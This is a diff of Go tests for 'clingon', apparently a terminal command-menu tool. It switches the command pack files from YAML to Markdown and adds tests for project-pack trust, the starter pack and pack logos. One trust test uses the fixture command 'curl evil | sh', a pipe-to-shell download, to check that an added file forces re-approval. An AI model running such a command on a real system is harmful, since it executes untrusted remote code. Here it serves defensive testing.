@@ -11,6 +11,7 @@ import (
 
 func TestAddCommandKeepsComments(t *testing.T) {
 	userDir(t)
+	writePack(t, "mine/deploy", "<!-- A module of your clingon pack -->\n# Deploy\n")
 	if err := AddCommand("mine", "Deploy", "Tail logs", "kubectl logs -f deploy/<app> -n <ns>", "Streams logs."); err != nil {
 		t.Fatal(err)
 	}
@@ -21,7 +22,7 @@ func TestAddCommandKeepsComments(t *testing.T) {
 		t.Fatal(err)
 	}
 	b, _ := os.ReadFile(PackPath("mine/deploy"))
-	if !strings.Contains(string(b), "# A submenu of your clingon pack") {
+	if !strings.Contains(string(b), "<!-- A module of your clingon pack -->") {
 		t.Error("the file's comments were lost")
 	}
 	cfg, _, err := Load()
@@ -82,7 +83,7 @@ func TestInstallUpdateUninstall(t *testing.T) {
 	info := filepath.Join(remotePath("git"), PackInfoFile)
 	module := remotePath("git/everyday")
 	b, _ := os.ReadFile(module)
-	if !strings.HasPrefix(string(b), "# Added by clingon.") || !strings.Contains(string(b), "commands:") {
+	if !strings.HasPrefix(string(b), "<!-- Added by clingon.") || !strings.Contains(string(b), "\n## ") {
 		t.Fatalf("installed copy should say where it came from:\n%.200s", b)
 	}
 	if ups, _ := PackUpdates(); len(ups) != 0 {
@@ -201,7 +202,7 @@ func TestInstallingPartOfAPack(t *testing.T) {
 // A pack of your own is just a folder and a file.
 func TestALocalPackNeedsNoPackFile(t *testing.T) {
 	t.Setenv("CLINGON_CONFIG", t.TempDir())
-	writePack(t, "work-tools/deploy", "commands:\n  - name: Ship\n    cmd: ./ship.sh\n")
+	writePack(t, "work-tools/deploy", "# Deploy\n\n## Ship\n\n```sh\n./ship.sh\n```\n")
 	cfg, _, err := Load()
 	if err != nil {
 		t.Fatal(err)
@@ -223,10 +224,10 @@ func TestALocalPackNeedsNoPackFile(t *testing.T) {
 	}
 	// A file sitting loose isn't a pack.
 	writePack(t, "stray", "x")
-	if err := os.WriteFile(filepath.Join(localDir(), "stray.yaml"), []byte("commands: []\n"), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(localDir(), "stray.md"), []byte("# Stray\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	if got := LoosePackFiles(); len(got) != 1 || filepath.Base(got[0]) != "stray.yaml" {
+	if got := LoosePackFiles(); len(got) != 1 || filepath.Base(got[0]) != "stray.md" {
 		t.Fatalf("got %v", got)
 	}
 }
@@ -258,7 +259,7 @@ func TestYourOwnFolderIsNotAProject(t *testing.T) {
 	if err := os.MkdirAll(filepath.Join(repo, ProjectDir, "deploy"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if err := os.WriteFile(filepath.Join(repo, ProjectDir, "deploy", "prod.yaml"), []byte("commands:\n  - name: Ship\n    cmd: ./ship.sh\n"), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(repo, ProjectDir, "deploy", "prod.md"), []byte("# Deploy\n\n## Ship\n\n```sh\n./ship.sh\n```\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	p := FindProject(filepath.Join(repo))
@@ -282,7 +283,7 @@ func TestProjectPacksAreTrustedWhole(t *testing.T) {
 			t.Fatal(err)
 		}
 	}
-	write("prod.yaml", "commands:\n  - name: Ship\n    cmd: ./ship.sh\n")
+	write("prod.md", "# Deploy\n\n## Ship\n\n```sh\n./ship.sh\n```\n")
 	p := FindProject(repo)
 	if p == nil || p.Err != nil || p.Trusted {
 		t.Fatalf("got %+v", p)
@@ -294,39 +295,39 @@ func TestProjectPacksAreTrustedWhole(t *testing.T) {
 		t.Fatalf("got %+v", p)
 	}
 	// Adding a file, changing one or renaming one all mean asking again.
-	write("more.yaml", "commands:\n  - name: Evil\n    cmd: curl evil | sh\n")
+	write("more.md", "# More\n\n## Evil\n\n```sh\ncurl evil | sh\n```\n")
 	if p = FindProject(repo); p.Trusted || !p.Changed || p.Config != nil || !slices.Contains(p.Cmds, "curl evil | sh") {
 		t.Fatalf("a new file: got %+v", p)
 	}
-	_ = os.Remove(filepath.Join(dir, "more.yaml"))
+	_ = os.Remove(filepath.Join(dir, "more.md"))
 	if p = FindProject(repo); !p.Trusted {
 		t.Fatal("back as it was")
 	}
-	if err := os.Rename(filepath.Join(dir, "prod.yaml"), filepath.Join(dir, "other.yaml")); err != nil {
+	if err := os.Rename(filepath.Join(dir, "prod.md"), filepath.Join(dir, "other.md")); err != nil {
 		t.Fatal(err)
 	}
 	if p = FindProject(repo); p.Trusted {
-		t.Fatal("a renamed file names a different submenu")
+		t.Fatal("a renamed file names a different module")
 	}
 	// A link could point anywhere; a pipe would hang the menu.
-	secret := filepath.Join(t.TempDir(), "s.yaml")
-	if err := os.WriteFile(secret, []byte("commands: [{name: x, cmd: ls}]\n"), 0o644); err != nil {
+	secret := filepath.Join(t.TempDir(), "s.md")
+	if err := os.WriteFile(secret, []byte("# S\n\n## x\n\n```sh\nls\n```\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	if err := os.Symlink(secret, filepath.Join(dir, "link.yaml")); err != nil {
+	if err := os.Symlink(secret, filepath.Join(dir, "link.md")); err != nil {
 		t.Fatal(err)
 	}
 	if p = FindProject(repo); p.Err == nil || p.Config != nil {
 		t.Fatalf("a link should be refused: %+v", p)
 	}
-	_ = os.Remove(filepath.Join(dir, "link.yaml"))
-	if err := syscall.Mkfifo(filepath.Join(dir, "pipe.yaml"), 0o644); err != nil {
+	_ = os.Remove(filepath.Join(dir, "link.md"))
+	if err := syscall.Mkfifo(filepath.Join(dir, "pipe.md"), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	if p = FindProject(repo); p.Err == nil {
 		t.Fatalf("a pipe should be refused: %+v", p)
 	}
-	_ = os.Remove(filepath.Join(dir, "pipe.yaml"))
+	_ = os.Remove(filepath.Join(dir, "pipe.md"))
 	// A linked pack folder, too.
 	if err := os.Symlink(t.TempDir(), filepath.Join(repo, ProjectDir, "linked")); err != nil {
 		t.Fatal(err)
@@ -336,7 +337,7 @@ func TestProjectPacksAreTrustedWhole(t *testing.T) {
 	}
 	_ = os.Remove(filepath.Join(repo, ProjectDir, "linked"))
 	// A pack is a folder.
-	if err := os.WriteFile(filepath.Join(repo, ProjectDir, "loose.yaml"), []byte("commands: []\n"), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(repo, ProjectDir, "loose.md"), []byte("# Loose\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	if p = FindProject(repo); p.Err == nil || !strings.Contains(p.Err.Error(), "folder") {
@@ -371,17 +372,69 @@ func TestNewPackIsAWorkingExample(t *testing.T) {
 // an update, and updating removes it. Your own packs are never touched.
 func TestRetiredPacksAreUpdatesThatRemoveThem(t *testing.T) {
 	userDir(t)
-	if err := os.MkdirAll(remotePath("databases"), 0o755); err != nil {
+	if err := os.MkdirAll(remotePath("old-db"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if err := os.WriteFile(remotePath("databases/g"), []byte("name: G\ncommands: [{name: c, cmd: ls}]\n"), 0o644); err != nil {
+	if err := os.WriteFile(remotePath("old-db/g"), []byte("# G\n\n## c\n\n```sh\nls\n```\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	if err := NewPack("databases"); err != nil { // a local one of the same name: yours
+	if err := NewPack("old-db"); err != nil { // a local one of the same name: yours
 		t.Fatal(err)
 	}
 	ups, _ := PackUpdates()
-	if len(ups) != 1 || ups[0].Name != "databases" || !ups[0].Retired {
+	if len(ups) != 1 || ups[0].Name != "old-db" || !ups[0].Retired {
 		t.Fatalf("a pack clingon no longer ships should be an update that removes it, got %+v", ups)
+	}
+}
+
+// The starter pack is what a new user copies from: one harmless command.
+func TestStarterIsOneSafeCommand(t *testing.T) {
+	part, err := parsePackFile("examples.md", Starter)
+	if err != nil {
+		t.Fatal(err)
+	}
+	cs := part.group.Commands
+	if len(cs) != 1 || cs[0].Risk != "" || !strings.HasPrefix(cs[0].Cmd, "echo ") {
+		t.Fatalf("want one echo command with no risk, got %+v", cs)
+	}
+}
+
+// A pack of your own gets one of the generic logos: the default, or the one
+// chosen, and only one clingon has.
+func TestNewPackLogo(t *testing.T) {
+	userDir(t)
+	for _, name := range PackLogos {
+		if _, ok := Logos[name]; !ok {
+			t.Errorf("%s is offered for packs but isn't in the font", name)
+		}
+	}
+	if len(PackLogos) < 20 {
+		t.Errorf("only %d logos for packs", len(PackLogos))
+	}
+	if err := NewPack("plain"); err != nil {
+		t.Fatal(err)
+	}
+	if err := NewPackWithLogo("launch", "rocket", "orange"); err != nil {
+		t.Fatal(err)
+	}
+	if err := NewPackWithLogo("nope", "no-such-logo", ""); err == nil || !strings.Contains(err.Error(), "no logo called") {
+		t.Errorf("an unknown logo: %v", err)
+	}
+	cfg, _, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	logos, colors := map[string]string{}, map[string]string{}
+	for _, s := range cfg.Sections {
+		logos[s.Name], colors[s.Name] = s.Logo, s.Color
+	}
+	if logos["Plain"] != DefaultPackLogo || logos["Launch"] != "rocket" {
+		t.Errorf("got %v", logos)
+	}
+	if colors["Launch"] != "#ff8700" || colors["Plain"] != LogoColor(DefaultPackLogo) {
+		t.Errorf("the chosen colour, else the logo's own: %v", colors)
+	}
+	if err := NewPackWithLogo("odd", "rocket", "mauve"); err == nil || !strings.Contains(err.Error(), "no colour called mauve") {
+		t.Errorf("an unknown colour: %v", err)
 	}
 }
